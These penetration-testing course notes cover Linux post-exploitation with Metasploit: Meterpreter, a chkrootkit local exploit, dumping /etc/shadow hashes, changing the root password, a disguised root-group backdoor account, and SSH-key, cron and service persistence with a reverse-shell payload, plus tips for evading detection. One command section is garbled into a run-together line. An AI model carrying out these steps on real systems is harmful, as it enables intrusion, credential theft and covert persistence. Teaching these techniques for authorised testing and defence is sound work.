# 2.5 - Post Expolitation / Pivoting

> **⚡ Prerequisites**
>
> * Basic familiarity with Linux & Windows
> * Basic familiarity with TCP & UDP protocols
>
> **📕 Learning Objectives**
>
> * Understand, install, configure and use **Metasploit Framework**
> * Perform **info-gathering**, **enumeration**, **exploitation**, **post exploitation** with Metasploit
>
> **🔬 Training list - PentesterAcademy/INE Labs**`subscription required`
>
> * ​[Metasploit Auxiliary modules](https://www.attackdefense.com/listingnoauth?labtype=metasploit\&subtype=metasploit-auxiliary)​
> * ​[MITRE ATT\&CK Linux Discovery](https://attackdefense.com/listing?labtype=mitre\&subtype=mitre-discovery)​
> * ​[Metasploit Meterpreter](https://attackdefense.com/listing?labtype=metasploit\&subtype=metasploit-meterpreter)​
> * ​[Linux Vulnerable Servers Exploitation - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=metasploit\&subtype=metasploit-linux-exploitation)​
> * ​[Linux Exploitation - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=linux-security-exploitation\&subtype=linux-security-exploitation-metasploit)​
> * ​[Linux Post Modules - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=linux-security-post-exploitation\&subtype=linux-security-post-exploitation-metasploit)​
> * ​[Win Basic Exploitation - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=windows-exploitation\&subtype=windows-exploitation-basics)​
> * ​[Win Pentesting Basic Exploitation](https://attackdefense.com/listing?labtype=windows-exploitation\&subtype=windows-exploitation-pentesting)​
> * ​[Win Apps Exploits - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=metasploit\&subtype=metasploit-windows-apps-exploits)​
> * ​[Win Post Exploitation - Metasploit](https://attackdefense.com/listing?labtype=windows-post-exploitation\&subtype=windows-post-exploitation-metasploit)​
> * ​[Win Maintaining Access](https://attackdefense.com/listing?labtype=windows-maintaining-access\&subtype=windows-maintaining-access-basics)​

{% content-ref url="https://app.gitbook.com/s/PNcjhcAuvH4mlZKYrNu3/readme/host-and-network-penetration-testing/2.3-the-metasploit-framework-msf/post-exploitation" %}
[Post Exploitation](https://app.gitbook.com/s/PNcjhcAuvH4mlZKYrNu3/readme/host-and-network-penetration-testing/2.3-the-metasploit-framework-msf/post-exploitation)
{% endcontent-ref %}

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

### ​[Post Exploitation](https://www.offsec.com/metasploit-unleashed/msf-post-exploitation/) with MSF <a href="#post-exploitation-with-msf" id="post-exploitation-with-msf"></a>

🗒️ **Post Exploitation** is the process of gaining further information or access to the target's internal network, after the initial exploitation phase, using various techniques like:

* **local enumeration**
* ​[**privilege escalation**](https://www.offsec.com/metasploit-unleashed/privilege-escalation/)​
* **maintaining persistent access**
* ​[**pivoting**](https://www.offsec.com/metasploit-unleashed/pivoting/)​
* **dumping hashes**
* **covering tracks**

There are many post exploitation modules provided by the MSF.🗒️ **Persistence** consists of techniques used by adversaries _to maintain access to systems across restarts, changed credentials, or other interruptions_.🗒️ [**Keylogging**](https://www.offsec.com/metasploit-unleashed/keylogging/) is the action of (secretly) _recording/capturing the keystrokes entered on a target system_.🗒️ **Pivoting** is a post exploitation technique of using a compromised host, a **`foothold`** / **`plant`**, to attack other systems on its private internal network.

### Fundamentals - [Meterpreter](https://www.offsec.com/metasploit-unleashed/about-meterpreter/)​ <a href="#fundamentals-meterpreter" id="fundamentals-meterpreter"></a>

Meterpreter is a post-exploitation payload used in penetration testing and ethical hacking. It is primarily associated with the Metasploit Framework, a popular penetration testing and exploitation tool. Meterpreter provides a powerful and flexible means for an attacker to interact with a compromised system after gaining initial access. Its functions and capabilities include:

1. **Remote Control**: Meterpreter allows an attacker to maintain control over a compromised system remotely. It provides a command-line interface (CLI) that allows the attacker to execute various commands on the target system.
2. **File System Manipulation**: An attacker can use Meterpreter to browse, upload, download, and manipulate files and directories on the compromised system. This can be useful for exfiltrating data, planting files, or carrying out other malicious activities.
3. **Privilege Escalation**: Meterpreter can be used to escalate privileges on the target system, enabling the attacker to gain administrator or root-level access, which provides greater control over the system.
4. **Port Forwarding**: It allows the attacker to set up port forwarding on the compromised system, which can be used to pivot through the target system to reach other systems on the network.
5. **Network Enumeration and Exploitation**: Meterpreter can gather information about the compromised system's network configuration, such as open ports and active connections. It can also be used to exploit vulnerabilities in other systems on the network.
6. **Screenshot Capture**: The attacker can capture screenshots of the target system's desktop, providing visual information about what the user is currently doing.
7. **Keylogging**: Meterpreter can log keystrokes on the compromised system, which can be used to capture sensitive information such as login credentials.
8. **Shell Access**: Meterpreter provides a fully interactive shell, allowing the attacker to run arbitrary commands on the target system. This shell can be upgraded to a more stable and feature-rich shell.
9. **Persistence**: It can be used to establish persistence on the compromised system, ensuring that the attacker can regain access even if the system is rebooted or undergoes maintenance.
10. **Automated Post-Exploitation Modules**: Metasploit includes a wide range of post-exploitation modules that leverage Meterpreter for various tasks, making it easier for attackers to carry out specific actions on the compromised system.
11. **Scriptable and Extendable**: Meterpreter can be scripted and extended to create custom post-exploitation capabilities, allowing attackers to tailor their activities to the specific target environment.

* 📌 **MSF has various types of `Meterpreter` payloads based on the target environment**

> 🔬 Check the [Meterpreter Labs](https://www.attackdefense.com/challengedetailsnoauth?cid=193) for various `Meterpreter` commands and techniques examples and how to upgrade shells to Meterpreter sessions.

#### Meterpreter Commands <a href="#meterpreter-commands" id="meterpreter-commands"></a>

ip -br -c aservice postgresql start && msfconsole -qdb\_statussetg RHOSTS 192.170.151.3setg RHOST 192.170.151.3workspace -a MeterpreterBasicsUUsing workspace is very helpful, because it saves results locally, and permits to find them with `loot` command.

* Meterpreter Commands
* In the **`Meterpreter`** session
* enum\_users\_history gets users history.

```bash
search enum_users_history 
use post/linux/gather/enum_users_history
```

#### Others

**chkrootkit** is a tool to locally check for signs of a [rootkit](https://www.chkrootkit.org/links/). It contains:

* chkrootkit: shell script that checks system binaries for rootkit modification.
* ifpromisc.c: checks if the interface is in promiscuous mode.
* chklastlog.c: checks for lastlog deletions.
* chkwtmp.c: checks for wtmp deletions.
* check\_wtmpx.c: checks for wtmpx deletions. (Solaris only)
* chkproc.c: checks for signs of LKM trojans.
* chkdirs.c: checks for signs of LKM trojans.
* strings.c: quick and dirty strings replacement.
* chkutmp.c: checks for utmp deletions.

If chkrootkit is running on target machine, and vs is less than 0.5, we can exploit it.

```bash
ps aux #process running on the system
cat /bin/check-down #see check-down source code
chkrootkit —help
chkrootkit -V #version, if it's less than 0.5, we can exploit it
search chkrootkit
use exploit/unix/local/chkrootkit
```

### Dumping Hashes With Hashdump

In Linux OS hashes are stored in the /etc/shadow file and can only be accessed by the root user or a user with root privileges.

Of course, in MSF there're a module called hashdump to dump linux user hashes from the /etc/shadow file and can also be used to unshadow the hashes for password cracking with [John the Ripper](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/john-the-ripper) tool.

After exploiting the target and starting Meterpreter Shell, we need to check if the target has root permission using getuid command, or we need to elevate it.

```bash
getuid
Server username: uid=0, gid=0, euid=0, egid=0
```

uid equals to 0 means that we've root permissions, then we can use meterpreter hashdump module:

```
search hashdump
use post/linux/gather/hashdump
```

This exploit generates a txt file with all hashes, we can see list of dump with `loot` command and read them using `cat` command.

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption><p><a href="https://images.squarespace-cdn.com/content/5a01100f692ebe0459a1859f/1603347414982-SZ68WZFHL6N9LG7S5HMF/BSY+Security+Class+Diagrams+-+_etc_passwd+(L).jpg?format=1500w&#x26;content-type=image%2Fjpeg">https://images.squarespace-cdn.com/content/5a01100f692ebe0459a1859f/1603347414982-SZ68WZFHL6N9LG7S5HMF/BSY+Security+Class+Diagrams+-+_etc_passwd+%28L%29.jpg?format=1500w&#x26;content-type=image%2Fjpeg</a></p></figcaption></figure>

After it, we can launch shell /bin/bash and f.e. change root psw:

```bash
shell
/bin/bash -i
passwd root
Enter new UNIX password: new_psw
Retype new UNIX password: new_psw
passed: password updated successfully
```

or we can add a new user:

```bash
useradd -m new_usr -s /bin/bash #and add psw
```

Analyzing root hash of /etc/shadow, file we can see that&#x20;

```
root:$y$j9T$hl8nD2cY/WEF55crjicKw1$7/bAEYLkcpy9sZJ1rZMYX9bFQLJj88qKomFAPB2QDEC:19566:0:99999:7:::
```

the initial characters of the password field value in _/etc/shadow_ identify the encryption algorithm:

* _$1$_ is [Message Digest 5 (MD5)](https://www.baeldung.com/cs/md5-vs-sha-algorithms#md5)
* _$2a$_ is [_blowfish_](https://www.baeldung.com/cs/des-vs-3des-vs-blowfish-vs-aes#3-blowfish)
* _$5$_ is [256-bit Secure Hash Algorithm (SHA-256)](https://www.baeldung.com/cs/md5-vs-sha-algorithms#sha-2)
* _$6$_ is [512-bit Secure Hash Algorithm (SHA-512)](https://www.baeldung.com/cs/md5-vs-sha-algorithms#1-security-1)
* _$y$_ (or _$7$_) is [_yescrypt_](https://www.openwall.com/yescrypt/)
* none of the above means DES

Critically, as of this writing, _**yescrypt**_**&#x20;with its contest entry** [_**yescrypt v2**_](https://www.password-hashing.net/submissions/specs/yescrypt-v2.pdf) **and** [**current specification**](https://github.com/openwall/yescrypt/blob/main/README)**, is widely-adopted and the default password hashing scheme for many recent versions of major distributions** like [Debian](https://www.debian.org/) 11/12, [Fedora](https://getfedora.org/) 35+, [Kali Linux](https://www.kali.org/get-kali/) 2021.1+, and [Ubuntu](https://ubuntu.com/) 22.04+. Further, it’s supported on Fedora 29+ and [RHEL](https://www.redhat.com/en) 9+. Still, many standard tools still don’t support _yescrypt_.

**Unlike Windows, on Linux we cannot use the hash to authenticate ourselves.**

### Establishing Persistence On Linux

#### Create backdoor user

NB: This technic only work if the target server is running with SSH or a remote access protocol, that can provide us with access whenever we need it (with usr and psw).

After exploiting the target and starting Meterpreter Shell, we need to check if the target has root permission using getuid command, or we need to elevate it.

```bash
shell
/bin/bash -i
cat /etc/passwd
#see it and make sure that account/service name that we want to use doesn't exist
useradd -m ftp -s /bin/bash #if we want to /var/www/html to make service less than clandestine
passwd ftp #create psw
usermod -aG root ftp #provides administrative or root privileges at ftp account
groups ftp #checks group of ftp account
usermod -u 15 ftp #optional, it's only to take ftp account less clandestine, UID (user identifier) is the unique number assigned to the user upon account creation
```

Now, we can use MSF module to take linux persistence using SSK Key (it's more reccomended because if the connection goes down, we can restablish it and in add, it's difficult to detect than others, infact we never need to change psw on the target system).

In details, this module will add an SSH key to a specified user (or all), to allow remote login via SSH at any time. If we don't specify user, module will add an SSH key to all users by default.

If we log in as the root user, it's not a suspicious activity, because if we both log in on the same account, we can't understand the detection.

```bash
search platform:linux persistence
use post/linux/manage/sshkey_persistence #it works with SSH private keys
show options
set CREATESSHFOLDER true #create ssh folder, becase target system may havve not the SSH folder already created
set SESSION number
```

After exploit it, will be added public key in all user accounts home directory and save in a txt file and see it with path visibile by`loot` command. After that, we can terminate all sessions `exit -y,` opening txt file that contains id rsa, and copy private key in a new file:

```bash
vim ssh_key #copy here and save contents of ssh private key
chmod 0400 ssh_key
ssh -i ssh_key root@IP #user@IP
```

We're in without creating a new user, cronjob or other.

In alternatively, we can use MSF module to take linux persistence using cron jobs:

```bash
search platform:linux persistence
use exploit/linux/local/cron_persistence #it's not the best solution, because update of cronjobs is easy to detect
show options
sessions #check if there're not conflict with others sessions LHOST ports (under connection)
```

If it doesn't work or in alternatively, we can use service\_persistence module (it creates a service on the box, and mark it for autorestart):

```bash
search platform:linux persistence
use exploit/linux/local/service_persistence
set payload cmd/unix/reverse_python #in alternative bind or reverse netcat
#check if there're not conflict with others sessions LHOST ports (under connection)
```
